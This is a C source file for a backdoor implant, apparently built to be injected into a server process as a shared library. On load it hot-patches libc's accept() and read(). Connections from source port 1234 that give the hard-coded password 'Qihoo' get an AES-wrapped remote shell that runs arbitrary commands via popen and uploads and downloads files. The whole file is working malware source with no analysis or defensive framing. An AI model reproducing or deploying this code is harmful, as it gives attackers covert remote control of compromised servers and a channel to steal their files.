#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <stdbool.h> 
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/aes.h>

#define BACKLOG 5
#define MAX_PATH 260
#define BUF_SIZE 32768

bool is_connect = false;
char g_old_accept_buffer[13];
char g_new_accept_buffer[] = "\x48\xb8\x48\x47\x46\x45\x44\x43\x43\x41\xff\xe0";
char g_old_read_buffer[13];
char g_new_read_buffer[] = "\x48\xb8\x48\x47\x46\x45\x44\x43\x43\x41\xff\xe0";
unsigned long  g_accept_addr;
unsigned long  g_read_addr;
char* LOG_LOCATION = "/tmp/inject-log.txt";
void* addr = 0x41424344;
int client_id;
int log;
AES_KEY encrypt_key, decrypt_key;
bool is_inject = false;

int my_accept(int sockfd, struct sockaddr* addr, socklen_t* addrlen);
ssize_t my_read(int fd, void* buf, size_t nbyte);
void hook_accept();
void hook_read();

void set_rand_decrypt_key(unsigned char* seed, int Length) {
	srand((int)time(0));
	memset(seed, '\0', sizeof(seed));
	int i = 0;
	for (i = 0; i < Length; i++)
	{
		seed[i] = rand();
	}
	memset(seed, '\0', sizeof(seed));
	memcpy(seed, "AESKey", sizeof(seed));
}

bool send_with_encrypt(void* buf, size_t len) {
	void* buf_encrpt = malloc(len);
	char* tmp = (char*)buf_encrpt;
	char* tmp2 = (char*)buf;
	memset(buf_encrpt, '\0', len);
	char log_buf[BUF_SIZE];
	int i = 0;
	for (i = 0; i < len / 16; i++) {
		AES_encrypt((unsigned char*)tmp2, (unsigned char*)tmp, &encrypt_key);
		tmp2 += 16;
		tmp += 16;
	}
	if (send(client_id, (char*)buf_encrpt, len, 0) >= 0) {
		snprintf(log_buf, sizeof(log_buf), "[*] send: %s\n", buf);
		printf("%s", log_buf);
		write(log, log_buf, strlen(log_buf));
		free(buf_encrpt);
		memset(buf, '\0', len);
		return true;
	}
	else {
		perror("[!] send");
		free(buf_encrpt);
		memset(buf, '\0', len);
		return false;
	}
}

bool send_with_encrypt2(void* buf, size_t len) {
	void* buf_encrpt = malloc(len);
	char* tmp = (char*)buf_encrpt;
	char* tmp2 = (char*)buf;
	memset(buf_encrpt, '\0', len);
	char log_buf[BUF_SIZE];

	int i = 0;
	for (i = 0; i < len / 16; i++) {
		AES_encrypt((unsigned char*)tmp2, (unsigned char*)tmp, &encrypt_key);
		tmp2 += 16;
		tmp += 16;
	}
	if (send(client_id, (char*)buf_encrpt, len, 0) >= 0) {
		snprintf(log_buf, sizeof(log_buf), "[*] send: %d\n", *((int*)buf));
		printf("%s", log_buf);
		write(log, log_buf, strlen(log_buf));
		free(buf_encrpt);
		memset(buf, '\0', len);
		return true;
	}
	else {
		perror("[!] send");
		free(buf_encrpt);
		memset(buf, '\0', len);
		return false;
	}
}

bool recv_with_decrypt(void* buf, size_t len) {
	void* buf_decrpt = malloc(len);
	char* tmp = (char*)buf_decrpt;
	char* tmp2 = (char*)buf;
	memset(buf, '\0', len);
	memset(buf_decrpt, '\0', len);
	char log_buf[BUF_SIZE];
	if (recv(client_id, buf, len, MSG_WAITALL) >= 0) {

		int i = 0;
		for (i = 0; i < len / 16; i++) {
			AES_decrypt((unsigned char*)tmp2, (unsigned char*)tmp, &decrypt_key);
			tmp2 += 16;
			tmp += 16;
		}
		memcpy(buf, buf_decrpt, len);
		snprintf(log_buf, sizeof(log_buf), "[*] recv: %s\n", buf_decrpt);
		printf("%s", log_buf);
		write(log, log_buf, strlen(log_buf));
		free(buf_decrpt);
		return true;
	}
	else {
		perror("[!] recv");
		free(buf_decrpt);
		return false;
	}
}

bool recv_with_decrypt2(void* buf, size_t len) {
	void* buf_decrpt = malloc(len);
	char* tmp = (char*)buf_decrpt;
	char* tmp2 = (char*)buf;
	memset(buf, '\0', len);
	memset(buf_decrpt, '\0', len);
	char log_buf[BUF_SIZE];
	if (recv(client_id, buf, len, MSG_WAITALL) >= 0) {
		int i = 0;
		for (i = 0; i < len / 16; i++) {
			AES_decrypt((unsigned char*)tmp2, (unsigned char*)tmp, &decrypt_key);
			tmp2 += 16;
			tmp += 16;
		}
		memcpy(buf, buf_decrpt, len);
		snprintf(log_buf, sizeof(log_buf), "[*] recv: %d\n", *((int*)buf_decrpt));
		printf("%s", log_buf);
		write(log, log_buf, strlen(log_buf));
		free(buf_decrpt);
		return true;
	}
	else {
		perror("[!] recv");
		free(buf_decrpt);
		return false;
	}
}

void __attribute__((constructor)) start(void)
{
	hook_accept();
	hook_read();
}

void hook_accept() {
	g_accept_addr = (unsigned long)(&accept);
	memcpy(g_old_accept_buffer, (char*)g_accept_addr, sizeof(g_old_accept_buffer));
	if (mprotect((void*)(((unsigned long)g_accept_addr / 4096 * 4096)), 4096, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
	{
		return;
	}
	*(unsigned long long*)((char*)g_new_accept_buffer + 2) = (unsigned long long) & my_accept;
	memcpy((char*)g_accept_addr, g_new_accept_buffer, sizeof(g_new_accept_buffer));
}

void hook_read() {
	if (!is_inject) {
		g_read_addr = (unsigned long)(&read);
		memcpy(g_old_read_buffer, (char*)g_read_addr, sizeof(g_old_read_buffer));
		if (mprotect((void*)(((unsigned long)g_read_addr / 4096 * 4096)), 4096, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
		{
			return;
		}
		*(unsigned long long*)((char*)g_new_read_buffer + 2) = (unsigned long long) & my_read;
		memcpy((char*)g_read_addr, g_new_read_buffer, sizeof(g_new_read_buffer));
	}
}

void unhook_accept() {
	memcpy((char*)g_accept_addr, g_old_accept_buffer, sizeof(g_old_accept_buffer));
}

void unhook_read() {
	memcpy((char*)g_read_addr, g_old_read_buffer, sizeof(g_old_read_buffer));
}

int my_accept(int sockfd, struct sockaddr* addr, socklen_t* addrlen) {
	unhook_accept();
	char log_buf[1024];
	log = open(LOG_LOCATION, O_APPEND | O_RDWR | O_CREAT);
	snprintf(log_buf, sizeof(log_buf), "[*] accept\n");
	write(log, log_buf, strlen(log_buf));
	client_id = accept(sockfd, addr, addrlen);
	hook_accept();
	if (1234 == ntohs(((struct sockaddr_in*)addr)->sin_port)) {
		int pid;
		if ((pid = fork()) == 0) {
			if (client_id < 0) {
				perror("[!] accept");
				return 0;
			}
			printf("[*] connect build\n");
			char buf_recv[1024];
			char buf_send[BUF_SIZE];
			snprintf(log_buf, sizeof(log_buf), "[*] connect build\n");

			write(log, log_buf, strlen(log_buf));
			unsigned char seed[32];
			set_rand_decrypt_key(seed, 31);
			if (!AES_set_encrypt_key(seed, 128, &encrypt_key)) {
				if (!AES_set_decrypt_key(seed, 128, &decrypt_key)) {
					snprintf(log_buf, sizeof(log_buf), "[*] set AES key with %s\n", seed);
					write(log, log_buf, strlen(log_buf));
				}
			}
			memset(buf_send, 0, sizeof(buf_send));
			memcpy(buf_send, seed, sizeof(seed));
			send(client_id, buf_send, sizeof(buf_send), 0);
			while (1) {
				if (recv_with_decrypt(buf_recv, sizeof(buf_recv))) {
					if (!strcmp(buf_recv, "Qihoo")) {
						strcpy(buf_send, "pass");
						send_with_encrypt(buf_send, sizeof(buf_send));
						break;
					}
					else {
						strcpy(buf_send, "denied");
						send_with_encrypt(buf_send, sizeof(buf_send));
					}
				}
			}
			FILE* subprocess = NULL;
			while (1)
			{
				if (recv_with_decrypt(buf_recv, sizeof(buf_recv)))
				{
					if (buf_recv[0] == 'c' && buf_recv[1] == 'd' && buf_recv[2] == ' ') {
						chdir(buf_recv + 3);
						getcwd(buf_send, sizeof(buf_send));
						sprintf(buf_send, "%s\n", buf_send);
						send_with_encrypt(buf_send, sizeof(buf_send));
					}
					else if (!strncmp(buf_recv, "download ", 9)) {
						unsigned char fileBuf[BUF_SIZE];
						char path[MAX_PATH];
						char* tmp = buf_recv;
						while (*tmp != ' ') {
							tmp++;
						}
						while (*tmp == ' ') {
							tmp++;
						}
						strcpy(path, tmp);
						tmp = path;
						while (*tmp != ' ') {
							tmp++;
						}
						*tmp = 0;
						snprintf(log_buf, sizeof(log_buf), "[*] download path %s\n", path);
						write(log, log_buf, strlen(log_buf));
						FILE* fp = fopen(path, "r");
						if (!fp) {
							strcpy(buf_send, "open file error\n");
							send_with_encrypt(buf_send, sizeof(buf_send));
							memset(buf_send, '\0', sizeof(buf_send));
							continue;
						}
						else {
							strcpy(buf_send, "open file success\n");
							send_with_encrypt(buf_send, sizeof(buf_send));
							memset(buf_send, '\0', sizeof(buf_send));
						}
						memset(buf_recv, 0, sizeof(buf_recv));
						recv_with_decrypt(buf_recv, sizeof(buf_recv));

						if (strcmp(buf_recv, "OK")) {
							printf("[!] not OK\n");
							continue;
						}
						memset(buf_recv, '\0', sizeof(buf_recv));
						fseek(fp, 0, SEEK_END);
						long int fileSize = ftell(fp);
						printf("[*] file size:%d\n", fileSize);
						fseek(fp, 0, SEEK_SET);
						memset(buf_send, '\0', sizeof(buf_send));
						memcpy(buf_send, &fileSize, sizeof(fileSize));
						send_with_encrypt2(buf_send, sizeof(buf_send));
						recv_with_decrypt(buf_recv, sizeof(buf_recv));

						if (strcmp(buf_recv, "OK")) {
							printf("[!] not OK\n");
							continue;
						}
						int blockNum = (fileSize / BUF_SIZE) + 1;
						int lastBlock = fileSize % BUF_SIZE;
						int i = 0;
						for (i = 0; i < blockNum; i++) {
							memset(fileBuf, '\0', BUF_SIZE);
							int readSize2 = (i == blockNum - 1 ? lastBlock : BUF_SIZE);
							int nodeSize = 0;
							while (nodeSize < readSize2) {
								int readSize = 0;
								printf("[*] want read file %d - %d = %d bytes\n", readSize2, nodeSize, readSize2 - nodeSize);
								if ((readSize = fread(fileBuf + nodeSize, 1, readSize2 - nodeSize, fp)) < 0) {
									perror("[!] read file");
									i = blockNum;
									break;
								}
								else {
									printf("[*] read file %d bytes\n", readSize);
									nodeSize += readSize;
								}
							}
							if ((send_with_encrypt(fileBuf, BUF_SIZE)) > 0) {
								printf("[*] send file %d/%d\n", i + 1, blockNum);
							}
							else {
								perror("[!] send file");
								break;
							}
						}
						fclose(fp);
						printf("[*] send file %s over\n", path);
					}
					else if (!strncmp(buf_recv, "upload ", 7)) {
						char* tmp = buf_recv;
						char path[MAX_PATH];
						while (*tmp != ' ') tmp++;
						while (*tmp == ' ') tmp++;
						while (*tmp != ' ') tmp++;
						while (*tmp == ' ') tmp++;
						strcpy(path, tmp);
						printf("[*] create file %s\n", path);
						FILE* fp = fopen(path, "wb+");
						if (fp == NULL) {
							perror("fopen");
							continue;
						}
						long fileSize = 0;
						recv_with_decrypt(buf_recv, sizeof(buf_recv));
						if (!strstr(buf_recv, "success")) {
							printf("[!] open file failed\n");
							continue;
						}
						memset(buf_send, '\0', sizeof(buf_send));
						strcpy(buf_send, "OK");
						send_with_encrypt(buf_send, sizeof(buf_send));
						recv_with_decrypt2(buf_recv, sizeof(buf_recv));
						memcpy(&fileSize, buf_recv, sizeof(fileSize));
						if (fileSize <= 0) {
							printf("[!] get file size error\n");
							continue;
						}
						printf("[*] file size:%d bytes\n", fileSize);
						memset(buf_send, '\0', sizeof(buf_send));
						strcpy(buf_send, "OK");
						send_with_encrypt(buf_send, sizeof(buf_send));

						char fileBuf[BUF_SIZE];
						int blockNum = (fileSize / BUF_SIZE) + 1;
						int lastBlock = fileSize % BUF_SIZE;

						int i = 0;
						for (i = 0; i < blockNum; i++) {
							memset(fileBuf, '\0', BUF_SIZE);
							int writeSize2 = (i == blockNum - 1 ? lastBlock : BUF_SIZE);
							if (recv_with_decrypt(fileBuf, BUF_SIZE)) {
								printf("[*] get file %d/%d\n", i + 1, blockNum);
								size_t nodeSize = 0;
								while (nodeSize < writeSize2) {
									int writeSize = 0;
									if ((writeSize = fwrite(fileBuf + nodeSize, 1, writeSize2 - nodeSize, fp)) < 0) {
										perror("[!] write file");
										i = blockNum;
										break;
									}
									else {
										printf("[*] write file %d bytes\n", writeSize);
										nodeSize += writeSize;
									}
								}
							}
							else {
								perror("[!] recv");
								i = blockNum;
							}
						}
						printf("[*] write file %s success\n", path);
						fclose(fp);
					}
					else
					{
						subprocess = popen(buf_recv, "r");
						if (subprocess == NULL)
						{
							perror("error");
						}
						else
						{
							while (fgets(buf_recv, sizeof(buf_recv), subprocess) != NULL)
								strcat(buf_send, buf_recv);
							send_with_encrypt(buf_send, sizeof(buf_send));
							pclose(subprocess);
							memset(buf_recv, '\0', sizeof(buf_recv));
						}
					}
				}
				else if (errno == 104) {
					printf("[!] connect close\n");
					break;
				}
				memset(buf_send, '\0', sizeof(buf_send));
				memset(buf_recv, '\0', sizeof(buf_recv));
			}
			close(log);
			close(client_id);
		}
		else {
			client_id = -1;
		}
	}
	return client_id;
}

ssize_t my_read(int fd, void* buf, size_t nbyte) {
	printf("[*] my_read\n");
	ssize_t ret;
	unhook_read();
	ret = read(fd, buf, nbyte);
	hook_read();
	struct sockaddr_in c, s;
	socklen_t cLen = sizeof(c);
	socklen_t sLen = sizeof(s);
	getsockname(fd, (struct sockaddr*)&s, &sLen);
	getpeername(fd, (struct sockaddr*)&c, &cLen);
	char log_buf[1024];
	snprintf(log_buf, sizeof(log_buf), "Client: %s:%d\nServer: %s:%d\nBuffer:%s\n", inet_ntoa(c.sin_addr), ntohs(c.sin_port), inet_ntoa(s.sin_addr), ntohs(s.sin_port), buf);
	printf("%s", log_buf);
	write(log, log_buf, strlen(log_buf));
	if (1234 == ntohs(((struct sockaddr_in*)&c)->sin_port) && !is_inject) {
		is_inject = true;
		int pid;
		if ((pid = fork()) == 0) {
			client_id = fd;
			if (client_id < 0) {
				perror("[!] accept");
				return 0;
			}
			printf("[*] connect build\n");
			char buf_recv[1024];
			char buf_send[BUF_SIZE];
			snprintf(log_buf, sizeof(log_buf), "[*] connect build\n");

			//write(log, log_buf, strlen(log_buf));
			unsigned char seed[32];
			set_rand_decrypt_key(seed, 31);
			memset(seed, 0, sizeof(seed));
			memcpy(seed, "AESKey", sizeof(seed));
			if (!AES_set_encrypt_key(seed, 128, &encrypt_key)&& !AES_set_decrypt_key(seed, 128, &decrypt_key)) {
				printf("[*] set AES key with %s\n", seed);
				snprintf(log_buf, sizeof(log_buf), "[*] set AES key with %s\n", seed);
				write(log, log_buf, strlen(log_buf));
			}
			else {
				printf("[*] set AES key with error\n");
			}
			memset(buf_send, 0, sizeof(buf_send));
			memcpy(buf_send, seed, sizeof(seed));
			send(client_id, buf_send, sizeof(buf_send), 0);
			while (1) {
				if (recv_with_decrypt(buf_recv, sizeof(buf_recv))) {
					if (!strcmp(buf_recv, "Qihoo")) {
						strcpy(buf_send, "pass");
						send_with_encrypt(buf_send, sizeof(buf_send));
						break;
					}
					else {
						strcpy(buf_send, "denied");
						send_with_encrypt(buf_send, sizeof(buf_send));
					}
				}
			}
			FILE* subprocess = NULL;
			while (1)
			{
				if (recv_with_decrypt(buf_recv, sizeof(buf_recv)))
				{
					if (buf_recv[0] == 'c' && buf_recv[1] == 'd' && buf_recv[2] == ' ') {
						chdir(buf_recv + 3);
						getcwd(buf_send, sizeof(buf_send));
						sprintf(buf_send, "%s\n", buf_send);
						send_with_encrypt(buf_send, sizeof(buf_send));
					}
					else if (!strncmp(buf_recv, "download ", 9)) {
						unsigned char fileBuf[BUF_SIZE];
						char path[MAX_PATH];
						char* tmp = buf_recv;
						while (*tmp != ' ') {
							tmp++;
						}
						while (*tmp == ' ') {
							tmp++;
						}
						strcpy(path, tmp);
						tmp = path;
						while (*tmp != ' ') {
							tmp++;
						}
						*tmp = 0;
						snprintf(log_buf, sizeof(log_buf), "[*] download path %s\n", path);
						write(log, log_buf, strlen(log_buf));
						FILE* fp = fopen(path, "r");
						if (!fp) {
							strcpy(buf_send, "open file error\n");
							send_with_encrypt(buf_send, sizeof(buf_send));
							memset(buf_send, '\0', sizeof(buf_send));
							continue;
						}
						else {
							strcpy(buf_send, "open file success\n");
							send_with_encrypt(buf_send, sizeof(buf_send));
							memset(buf_send, '\0', sizeof(buf_send));
						}
						memset(buf_recv, 0, sizeof(buf_recv));
						recv_with_decrypt(buf_recv, sizeof(buf_recv));

						if (strcmp(buf_recv, "OK")) {
							printf("[!] not OK\n");
							continue;
						}
						memset(buf_recv, '\0', sizeof(buf_recv));
						fseek(fp, 0, SEEK_END);
						long int fileSize = ftell(fp);
						printf("[*] file size:%d\n", fileSize);
						fseek(fp, 0, SEEK_SET);
						memset(buf_send, '\0', sizeof(buf_send));
						memcpy(buf_send, &fileSize, sizeof(fileSize));
						send_with_encrypt2(buf_send, sizeof(buf_send));
						recv_with_decrypt(buf_recv, sizeof(buf_recv));

						if (strcmp(buf_recv, "OK")) {
							printf("[!] not OK\n");
							continue;
						}
						int blockNum = (fileSize / BUF_SIZE) + 1;
						int lastBlock = fileSize % BUF_SIZE;
						int i = 0;
						for (i = 0; i < blockNum; i++) {
							memset(fileBuf, '\0', BUF_SIZE);
							int readSize2 = (i == blockNum - 1 ? lastBlock : BUF_SIZE);
							int nodeSize = 0;
							while (nodeSize < readSize2) {
								int readSize = 0;
								printf("[*] want read file %d - %d = %d bytes\n", readSize2, nodeSize, readSize2 - nodeSize);
								if ((readSize = fread(fileBuf + nodeSize, 1, readSize2 - nodeSize, fp)) < 0) {
									perror("[!] read file");
									i = blockNum;
									break;
								}
								else {
									printf("[*] read file %d bytes\n", readSize);
									nodeSize += readSize;
								}
							}
							if ((send_with_encrypt(fileBuf, BUF_SIZE)) > 0) {
								printf("[*] send file %d/%d\n", i + 1, blockNum);
							}
							else {
								perror("[!] send file");
								break;
							}
						}
						fclose(fp);
						printf("[*] send file %s over\n", path);
					}
					else if (!strncmp(buf_recv, "upload ", 7)) {
						char* tmp = buf_recv;
						char path[MAX_PATH];
						while (*tmp != ' ') tmp++;
						while (*tmp == ' ') tmp++;
						while (*tmp != ' ') tmp++;
						while (*tmp == ' ') tmp++;
						strcpy(path, tmp);
						printf("[*] create file %s\n", path);
						FILE* fp = fopen(path, "wb+");
						if (fp == NULL) {
							perror("fopen");
							continue;
						}
						long fileSize = 0;
						recv_with_decrypt(buf_recv, sizeof(buf_recv));
						if (!strstr(buf_recv, "success")) {
							printf("[!] open file failed\n");
							continue;
						}
						memset(buf_send, '\0', sizeof(buf_send));
						strcpy(buf_send, "OK");
						send_with_encrypt(buf_send, sizeof(buf_send));
						recv_with_decrypt2(buf_recv, sizeof(buf_recv));
						memcpy(&fileSize, buf_recv, sizeof(fileSize));
						if (fileSize <= 0) {
							printf("[!] get file size error\n");
							continue;
						}
						printf("[*] file size:%d bytes\n", fileSize);
						memset(buf_send, '\0', sizeof(buf_send));
						strcpy(buf_send, "OK");
						send_with_encrypt(buf_send, sizeof(buf_send));

						char fileBuf[BUF_SIZE];
						int blockNum = (fileSize / BUF_SIZE) + 1;
						int lastBlock = fileSize % BUF_SIZE;
						int i = 0;
						for (i = 0; i < blockNum; i++) {
							memset(fileBuf, '\0', BUF_SIZE);
							int writeSize2 = (i == blockNum - 1 ? lastBlock : BUF_SIZE);
							if (recv_with_decrypt(fileBuf, BUF_SIZE)) {
								printf("[*] get file %d/%d\n", i + 1, blockNum);
								size_t nodeSize = 0;
								while (nodeSize < writeSize2) {
									int writeSize = 0;
									if ((writeSize = fwrite(fileBuf + nodeSize, 1, writeSize2 - nodeSize, fp)) < 0) {
										perror("[!] write file");
										i = blockNum;
										break;
									}
									else {
										printf("[*] write file %d bytes\n", writeSize);
										nodeSize += writeSize;
									}
								}
							}
							else {
								perror("[!] recv");
								i = blockNum;
							}
						}
						printf("[*] write file %s success\n", path);
						fclose(fp);
					}
					else
					{
						subprocess = popen(buf_recv, "r");
						if (subprocess == NULL)
						{
							perror("error");
						}
						else
						{
							while (fgets(buf_recv, sizeof(buf_recv), subprocess) != NULL)
								strcat(buf_send, buf_recv);
							send_with_encrypt(buf_send, sizeof(buf_send));
							pclose(subprocess);
							memset(buf_recv, '\0', sizeof(buf_recv));
						}
					}
				}
				else if (errno == 104) {
					printf("[!] connect close\n");
					break;
				}
				memset(buf_send, '\0', sizeof(buf_send));
				memset(buf_recv, '\0', sizeof(buf_recv));
			}
			close(log);
			close(client_id);
		}
		else {
			printf("close socket:%d\n", fd);
			close(fd);
		}
	}

	return ret;
}